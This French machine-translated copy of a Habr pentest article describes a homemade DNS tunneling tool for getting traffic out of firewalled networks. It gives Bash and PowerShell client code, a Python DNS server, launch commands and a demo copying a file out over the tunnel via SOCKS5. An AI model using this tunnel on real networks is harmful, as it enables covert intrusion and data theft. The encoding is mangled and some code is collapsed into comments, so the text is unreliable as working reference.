<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü¶Ñ üë©üèø‚ÄçüöÄ üë©üèø‚Äç‚öñÔ∏è Trafic au bout du tunnel ou DNS dans le pentest üö£üèø ‚èπÔ∏è ‚úäüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Salut Dans les projets de test de p√©n√©tration, nous rencontrons souvent des r√©seaux segment√©s en dur qui sont presque compl√®tement isol√©s du monde ext...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Trafic au bout du tunnel ou DNS dans le pentest</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Salut  Dans les projets de test de p√©n√©tration, nous rencontrons souvent des r√©seaux segment√©s en dur qui sont presque compl√®tement isol√©s du monde ext√©rieur.  Parfois, pour r√©soudre ce probl√®me, il est n√©cessaire de transf√©rer le trafic via le seul protocole disponible - DNS.  Dans cet article, nous vous expliquerons comment r√©soudre un probl√®me similaire en 2018 et quels pi√®ges sont rencontr√©s dans le processus.  Les utilitaires populaires seront √©galement examin√©s et une version de leur propre utilitaire open-source avec des fonctionnalit√©s qui manquent g√©n√©ralement dans les outils similaires existants sera pr√©sent√©e. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  Que sont les tunnels DNS </h1><br><p>  Il existe d√©j√† <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">plusieurs</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">articles</a> sur Habr√© qui expliquent ce qu'est la tunnelisation DNS.  Cependant, un peu de th√©orie sur la tunnelisation DNS peut √™tre trouv√©e sous le spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">Qu'est-ce que la tunnellisation DNS?</b> <div class="spoiler_text"><p>  Il arrive que l'acc√®s au r√©seau soit strictement coup√© par le pare-feu, et vous devez tr√®s mal transf√©rer les donn√©es, puis la technique de tunneling DNS vient √† la rescousse. </p><br><p>  Dans le diagramme, tout ressemble √† ceci: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  Les requ√™tes DNS, m√™me avec les param√®tres de pare-feu les plus rigoureux, passent parfois, et vous pouvez les utiliser en y r√©pondant depuis votre serveur situ√© de l'autre c√¥t√©.  La communication sera extr√™mement lente, mais cela suffit pour p√©n√©trer le r√©seau local de l'organisation ou, par exemple, pour acc√©der d'urgence √† Internet via une connexion Wi-Fi payante √† l'√©tranger. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  Ce qui est populaire en ce moment </h1><br><p>  Maintenant, sur Internet, vous pouvez trouver de nombreux utilitaires pour utiliser cette technique - chacun avec ses propres fonctionnalit√©s et bogues.  Nous avons s√©lectionn√© les cinq plus populaires pour les tests comparatifs: </p><br><ul><li>  dnscat2 </li><li>  iode </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  Vous pouvez en savoir plus sur la fa√ßon dont nous les avons test√©s dans notre article sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Hacker</a> .  Ici, nous ne donnons que les r√©sultats. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  Comme vous pouvez le voir sur les r√©sultats, vous pouvez travailler, mais du point de vue des tests de p√©n√©tration, il y a des inconv√©nients: </p><br><ul><li>  clients compil√©s - sur les machines avec antivirus, il est beaucoup plus facile d'ex√©cuter quelque chose d'interpr√©t√© qu'un fichier binaire; </li><li>  travail instable sous Windows; </li><li>  la n√©cessit√© d'installer des logiciels suppl√©mentaires dans certains cas. </li></ul><br><p>  En raison de ces lacunes, nous devions d√©velopper notre propre outil, et c'est ainsi qu'il s'est av√©r√© ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Cr√©ez votre propre utilitaire de tunneling DNS </h1><br><h2 id="predystoriya">  Contexte </h2><br><p>  Tout a commenc√© lors du pentest interne d'une banque.  Dans le hall, un ordinateur public √©tait utilis√© pour imprimer des documents, des certificats et d'autres papiers.  Notre objectif: tirer le meilleur parti d'une machine qui ex√©cutait Windows 7, avait Kaspersky Anti-Virus √† bord et ne permettait d'acc√©der qu'√† certaines pages (mais en m√™me temps, il √©tait possible de r√©soudre les noms DNS). </p><br><p>  Apr√®s avoir effectu√© l'analyse initiale et obtenu des donn√©es suppl√©mentaires de la voiture, nous avons d√©velopp√© plusieurs vecteurs d'attaque.  Les chemins avec le fonctionnement de la machine utilisant des programmes binaires ont √©t√© imm√©diatement supprim√©s sur le c√¥t√©, car le "grand et terrible" "Kaspersky" a imm√©diatement d√©tect√© son effacement d'un fichier ex√©cutable.  Cependant, nous avons r√©ussi √† avoir la possibilit√© d'ex√©cuter des scripts au nom de l'administrateur local, apr√®s quoi l'une des id√©es √©tait simplement la possibilit√© de cr√©er un tunnel DNS. </p><br><p>  En recherchant des m√©thodes possibles, nous avons trouv√© un client sur PowerShell pour dnscat2 (nous l'avons √©crit plus t√¥t).  Mais au final, le maximum que nous avons pu produire √©tait d'√©tablir une connexion pour une courte p√©riode, apr√®s quoi le client s'est √©cras√©. </p><br><p>  Cela, pour le moins, nous a √©norm√©ment boulevers√©s, car dans cette situation, la pr√©sence d'un client interpr√©t√© √©tait simplement n√©cessaire.  En fait, c'√©tait l'une des raisons pour lesquelles nous avons d√©velopp√© notre propre outil de tunneling DNS. </p><br><h2 id="trebovaniya">  Pr√©requis </h2><br><p>  Nos principales exigences pour nous-m√™mes sont: </p><br><ul><li>  la pr√©sence de clients universels (dans la mesure du possible) et interpr√©t√©s pour les syst√®mes Unix et Windows.  Pour les clients, bash et Powershell ont √©t√© s√©lectionn√©s, respectivement.  √Ä l'avenir, un client Perl pour unix est pr√©vu; </li><li>  la possibilit√© de transf√©rer du trafic √† partir d'une application sp√©cifique; </li><li>  Prise en charge de plusieurs clients pour un seul utilisateur. </li></ul><br><h2 id="arhitektura-proekta">  Architecture de projet </h2><br><p>  Sur la base des exigences, nous avons commenc√© le d√©veloppement.  √Ä notre avis, l'utilitaire se compose de 3 parties: un client sur la machine interne, un serveur DNS et un petit proxy entre l'application pentester et le serveur DNS. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  Pour commencer, nous avons d√©cid√© de transmettre le tunnel via les enregistrements TXT. </p><br><p>  Le principe de fonctionnement est assez simple: </p><br><ul><li>  Pentester lance un serveur DNS. </li><li>  Un pentester (ou un utilisateur, via l'ing√©nierie sociale) lance un client sur une machine interne.  Sur le client, il existe des param√®tres tels que le nom et le domaine du client, et il est √©galement possible de sp√©cifier directement l'adresse IP du serveur DNS. </li><li> Pentester (√† partir d'un r√©seau externe) d√©marre un proxy, o√π il indique l'adresse IP du serveur DNS, ainsi que le port o√π frapper, les cibles IP (par exemple, ssh dans le r√©seau interne o√π le client est assis) et, en cons√©quence, le port cible.  Un ID client est √©galement requis, qui peut √™tre obtenu en ajoutant la cl√© <code>--clients</code> . </li><li>  Pentester lance l'application qui l'int√©resse, pointant le port proxy vers localhost. </li></ul><br><h2 id="protokol-obscheniya">  Protocole de communication </h2><br><p>  Prenons un protocole assez simple pour la communication entre un serveur et un client. </p><br><h3 id="registraciya">  Inscription </h3><br><p>  Lorsque le client d√©marre, il s'enregistre aupr√®s du serveur, demandant un enregistrement TXT via un sous-domaine du format suivant: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - cl√© d'enregistrement <br>  <code>&lt;7 random chars&gt;</code> - pour √©viter la mise en cache des enregistrements DNS <br>  <code>&lt;client name&gt;</code> - le nom donn√© au client au d√©marrage <br>  <code>&lt;your domain&gt;</code> - ex.: xakep.ru <br>  En cas d'inscription r√©ussie, le client re√ßoit un message de r√©ussite dans la r√©ponse TXT, ainsi que l'identifiant qui lui est attribu√©, qu'il continuera √† utiliser. </p><br><h3 id="osnovnoy-cikl">  Cycle principal </h3><br><p>  Apr√®s l'enregistrement, le client commence √† interroger le serveur sur la disponibilit√© de nouvelles donn√©es au format </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  S'il y a de nouvelles donn√©es, dans la r√©ponse TXT il les re√ßoit au format </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , sinon, <code>&lt;id&gt;ND</code> arrive. </p><br><h3 id="cikl-zagruzki-dannyh">  Cycle de chargement des donn√©es </h3><br><p>  Le client dans une boucle v√©rifie si les donn√©es proviennent de notre <code>&lt;target&gt;</code> .  S'il y a une r√©ponse, nous lisons, √† partir de ce qui est venu, un tampon de taille N Kb, le d√©composons en blocs de <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> et envoyons les donn√©es bloc par bloc au format: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  Si le transfert de bloc est r√©ussi, nous obtenons OK avec certaines donn√©es sur le bloc transf√©r√©; dans le cas de l'ach√®vement du transfert de tampon, nous obtenons <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  Serveur DNS </h2><br><p>  Le serveur DNS pour le tunneling a √©t√© √©crit en Python3 √† l'aide de la biblioth√®que dnslib, ce qui facilite la cr√©ation de votre propre r√©solveur DNS en h√©ritant de l'objet dnslib.ProxyResolver et en rempla√ßant la m√©thode resol (). </p><br><p>  Great dnslib vous permet de cr√©er votre propre proxyDNS tr√®s rapidement: </p><br><div class="spoiler">  <b class="spoiler_title">Un peu de code serveur</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  Dans resolver (), nous d√©finissons les r√©ponses aux requ√™tes DNS du client: enregistrement, demande de nouveaux enregistrements, donn√©es de publication et suppression de l'utilisateur. </p><br><p>  Nous stockons des informations sur les utilisateurs dans la base de donn√©es SQLite, le presse-papiers de donn√©es est situ√© dans la RAM et a la structure suivante, dans laquelle la cl√© est le num√©ro de client: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP ‚Äú‚Äù -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  ‚Äú‚Äù <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  Pour mettre les donn√©es du pentester dans le tampon, nous avons √©crit un petit ¬´r√©cepteur¬ª, qui est lanc√© dans un flux s√©par√©.  Il intercepte les connexions du pentester et effectue le routage: vers quel client envoyer les demandes. </p><br><p>  Avant de d√©marrer le serveur, l'utilisateur doit d√©finir un seul param√®tre: DOMAIN_NAME - le nom du domaine avec lequel le serveur fonctionnera. </p><br><h2 id="klient-na-bash">  Client Bash </h2><br><p>  Bash a √©t√© choisi pour √©crire un client pour les syst√®mes Unix, comme on le trouve le plus souvent dans les syst√®mes Unix modernes.  Bash offre la possibilit√© de se connecter via / dev / tcp /, m√™me avec des droits d'utilisateur non privil√©gi√©s. </p><br><p>  Nous n'analyserons pas chaque morceau de code en d√©tail, ne regardons que les points les plus int√©ressants. <br>  Le principe du client est simple.  Pour communiquer avec DNS, l'utilitaire de <code>dig</code> standard est utilis√©.  Le client s'enregistre aupr√®s du serveur, apr√®s quoi, dans le cycle perp√©tuel, il commence √† r√©pondre aux demandes en utilisant le protocole d√©crit pr√©c√©demment.  Sous le spoiler plus. </p><br><div class="spoiler">  <b class="spoiler_title">En savoir plus sur le client Bash</b> <div class="spoiler_text"><p>  Une v√©rification est en cours pour d√©terminer si une connexion a √©t√© √©tablie et, dans l'affirmative, la fonction de r√©ponse est ex√©cut√©e (lecture des donn√©es re√ßues de la cible, division et envoi au serveur). </p><br><p>  Apr√®s cela, il est v√©rifi√© s'il existe de nouvelles donn√©es du serveur.  S'ils sont trouv√©s, nous v√©rifions si la connexion doit √™tre interrompue.  L'√©cart lui-m√™me se produit lorsque nous recevons des informations sur la cible avec ip 0.0.0.0 et le port 00. Dans ce cas, nous effa√ßons le descripteur de fichier (s'il n'√©tait pas ouvert, il n'y aura aucun probl√®me) et changeons l'ip cible en 0.0.0.0 entrant. </p><br><p>  Plus loin dans le code, nous voyons s'il est n√©cessaire d'√©tablir une nouvelle connexion.  D√®s que les messages suivants commencent √† nous envoyer des donn√©es pour la cible, nous, dans le cas o√π l'ip pr√©c√©dente ne correspond pas √† celle actuelle (ce sera le cas apr√®s la r√©initialisation), changeons la cible en une nouvelle et √©tablissons une connexion via la commande <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , o√π <code>$ip</code> est la cible, <code>$port</code> est le port cible. <br>  Par cons√©quent, si la connexion est d√©j√† √©tablie, alors la donn√©e entrante est d√©cod√©e et vole vers le descripteur via la commande <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , o√π <code>${data_array[2]}</code> est ce que nous avons obtenu du serveur. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Pensez maintenant √† envoyer la fonction de r√©ponse.  Tout d'abord, nous lisons 2048 octets du descripteur et les codons imm√©diatement via <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Ensuite, si la r√©ponse est vide, nous quittons la fonction, sinon nous commen√ßons l'op√©ration de fractionnement et d'envoi.  Notez qu'apr√®s la formation de la demande d'envoi via dig, la livraison est v√©rifi√©e pour le succ√®s.  En cas de succ√®s, quittez le cycle, sinon essayez jusqu'√† ce qu'il fonctionne. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Client Powershell: </h2><br><p>  √âtant donn√© que nous avions besoin d'une interpr√©tabilit√© compl√®te et de travailler sur la plupart des syst√®mes actuels, le client de base pour Windows est l'utilitaire nslookup standard pour communiquer via DNS et l'objet System.Net.Sockets.TcpClient pour √©tablir une connexion sur le r√©seau interne. </p><br><p>  Tout est √©galement tr√®s simple.  Chaque it√©ration de la boucle est un appel √† la commande nslookup √† l'aide du protocole d√©crit pr√©c√©demment. </p><br><p>  Par exemple, pour vous inscrire, ex√©cutez la commande: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  Si des erreurs se produisent, nous ne les affichons pas, en envoyant les valeurs du descripteur d'erreur √† $ null. </p><br><p>  nslookup nous renvoie une r√©ponse similaire: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  Apr√®s quoi nous devons √©tirer toutes les lignes entre guillemets, pour lesquelles nous les parcourons avec une saison r√©guli√®re: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Vous pouvez maintenant traiter les commandes re√ßues. <br>  Chaque fois que l'adresse IP de la ¬´victime¬ª change, un client TCP est cr√©√©, une connexion est √©tablie et le transfert de donn√©es commence.  √Ä partir du serveur DNS, les informations sont d√©cod√©es en base64 et des octets sont envoy√©s √† la victime.  Si la ¬´victime¬ª a r√©pondu √† quelque chose, alors nous encodons, divisons en parties et ex√©cutons les requ√™tes nslookup selon le protocole.  C‚Äôest tout. <br>  Lorsque vous appuyez sur Ctrl + C, une demande de suppression du client est ex√©cut√©e. </p><br><h2 id="proxy">  Proxy: </h2><br><p>  Le proxy du pentester est un petit serveur proxy en python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  Dans les param√®tres dont vous avez besoin pour sp√©cifier l'IP du serveur DNS, le port o√π se connecter au serveur, l'option --clients renvoie une liste de clients enregistr√©s, <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - id du client avec lequel nous allons work (vu apr√®s l'ex√©cution de <code>--clients</code> ), - <code>--send_timeout</code> - timeout pour l'envoi de messages depuis l'application. </p><br><p>  Lorsqu'il est lanc√© avec le param√®tre <code>--clients</code> , le proxy envoie une requ√™te au serveur au format <code>\x00GETCLIENTS\n</code> . <br>  Dans le cas o√π nous commen√ßons √† travailler, lors de la connexion, nous envoyons un message au format <code>\x02RESET:client_id\n</code> pour r√©initialiser la connexion pr√©c√©dente.  Apr√®s avoir envoy√© des informations sur notre cible: <code>\x01client_id:ip:port:\n</code> <br>  De plus, lors de l'envoi de messages au client, nous envoyons des octets au format <code>\x03data</code> , et nous envoyons simplement des octets bruts √† l'application. <br>  De plus, le proxy prend en charge le mode SOCKS5. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  Quelles difficult√©s peuvent survenir? </h2><br><p>  Comme avec tout m√©canisme, l'utilitaire peut √©chouer.  N'oublions pas que le tunnel DNS est mince, et de nombreux facteurs peuvent influencer son travail, de l'architecture r√©seau √† la qualit√© de la connexion √† votre serveur de production. </p><br><p>  Pendant les tests, nous avons parfois remarqu√© de petits probl√®mes.  Par exemple, √† des vitesses d'impression √©lev√©es, en utilisant ssh, il vaut la peine de d√©finir le param√®tre <code>--send_timeout</code> , sinon le client commence √† se figer.  De plus, la connexion peut parfois ne pas √™tre √©tablie la premi√®re fois, mais elle peut √™tre facilement trait√©e en red√©marrant le proxy, car la connexion sera r√©initialis√©e lors de la nouvelle connexion.  Il y avait √©galement des probl√®mes avec la r√©solution de domaine lorsque vous travaillez avec des cha√Ænes proxy, mais cela peut √©galement √™tre r√©solu si vous sp√©cifiez un param√®tre suppl√©mentaire pour les cha√Ænes proxy.  Il convient de noter qu'√† l'heure actuelle, l'utilitaire ne contr√¥le pas l'apparence des demandes inutiles de la mise en cache des serveurs DNS, de sorte que la connexion peut parfois √©chouer, cependant, cela est √† nouveau trait√© en utilisant la m√©thode d√©crite ci-dessus. </p><br><h2 id="zapusk">  Lancement </h2><br><p>  Configurez les enregistrements NS sur le domaine: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  Nous attendons que le cache soit mis √† jour (g√©n√©ralement jusqu'√† 5 heures). </p><br><p>  Nous d√©marrons le serveur: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Lancez le client (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Nous d√©marrons le client (Win): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Voyons la liste des clients connect√©s: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Lancez le proxy: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Test: </p><br><p>  Une fois le serveur et au moins un client d√©marr√©s, nous pouvons acc√©der au proxy comme s'il s'agissait de notre machine distante. <br>  Essayons de simuler la situation suivante: un pentester veut t√©l√©charger un fichier √† partir d'un serveur √† partir du r√©seau local d'une organisation prot√©g√©e par un pare-feu, tout en utilisant des m√©thodes d'ing√©nierie sociale, il a pu forcer un client DNS √† s'ex√©cuter √† l'int√©rieur du r√©seau et trouver le mot de passe du serveur SSH. </p><br><p>  Pentester sur sa machine d√©marre un proxy, indiquant le client n√©cessaire et peut ensuite passer des appels similaires qui seront envoy√©s au client et du client au r√©seau local. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Voyons ce qui s'est pass√©: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  En haut √† gauche, vous pouvez voir les requ√™tes DNS qui arrivent sur le serveur, le trafic proxy en haut √† droite, le trafic client en bas √† gauche et notre application en bas √† droite.  La vitesse s'est av√©r√©e assez d√©cente pour le tunnel DNS: 4,9 Ko / s en utilisant la compression. </p><br><p>  Lorsqu'il est lanc√© sans compression, l'utilitaire affiche une vitesse de 1,8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Examinons attentivement le trafic du serveur DNS, pour cela, nous utilisons l'utilitaire tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  Nous voyons que tout est conforme au protocole d√©crit: le client interroge constamment le serveur s'il a de nouvelles donn√©es pour ce client en utilisant des requ√™tes comme <code>1c6Zx9Vi39.oversec.ru</code> .  S'il y a des donn√©es, le serveur r√©pond avec un ensemble d'enregistrements TXT, sinon% client_num% ND ( <code>39ND</code> ).  Le client envoie des informations au serveur en utilisant les types de requ√™tes <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  Dans les vid√©os suivantes, vous pouvez clairement voir comment l'utilitaire fonctionne en conjonction avec meterpreter et en mode SOCKS5. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  Le r√©sultat: </h2><br><p>  R√©sumons un peu.  Quelles sont les fonctionnalit√©s de ce d√©veloppement et pourquoi recommandons-nous de l'utiliser? </p><br><ol><li>  Clients interpr√©t√©s sur Bash et Powershell: aucun EXE-shnikov et ELF-s qui peuvent √™tre difficiles √† ex√©cuter. </li><li>  Stabilit√© de la connexion: dans les tests, notre utilitaire s'est comport√© beaucoup plus stable, et s'il y avait des bugs, vous pourriez simplement vous reconnecter, tandis que le client ne plantait pas, comme c'√©tait le cas avec dnscat2, par exemple. </li><li>  Vitesse assez √©lev√©e pour le tunnel DNS: bien s√ªr, la vitesse n'atteint pas l'iode, mais il existe une solution compil√©e de beaucoup plus bas niveau. </li><li>  Aucun droit d'administrateur n'est requis: le client Bash fonctionne sans droits d'administrateur et les scripts Powershell sont parfois interdits par les politiques de s√©curit√©, mais cela est assez simple √† faire. </li><li>  Il existe un mode proxy socks5, qui vous permet de le faire <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> ou d'ex√©cuter nmap sur l'ensemble du r√©seau interne. </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Le code utilitaire est disponible ici.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr432078/">https://habr.com/ru/post/fr432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
